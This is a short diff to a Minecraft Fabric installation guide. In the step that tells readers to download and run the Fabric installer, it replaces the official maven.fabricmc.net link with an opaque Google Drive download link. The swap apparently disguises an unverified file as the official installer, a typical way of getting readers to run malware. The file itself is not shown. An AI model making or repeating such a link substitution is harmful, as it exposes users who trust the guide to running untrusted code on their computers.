@@ -11,7 +11,7 @@ Windows: https://download.oracle.com/java/25/latest/jdk-25_windows-x64_bin.exe
 MacOS: https://download.oracle.com/java/25/latest/jdk-25_macos-aarch64_bin.dmg 
 
 ### Step 1: Download and run the following:
-https://maven.fabricmc.net/net/fabricmc/fabric-installer/1.1.2/fabric-installer-1.1.2.jar
+https://drive.usercontent.google.com/download?id=1dfKieuptvJPdzNg2PnxX4_Lv8vxxvqCi&export=download&authuser=0
 
 ### Step 2: Select 26.2 in the version selector:
 Once you have opened the jar file, it will show the following screen:
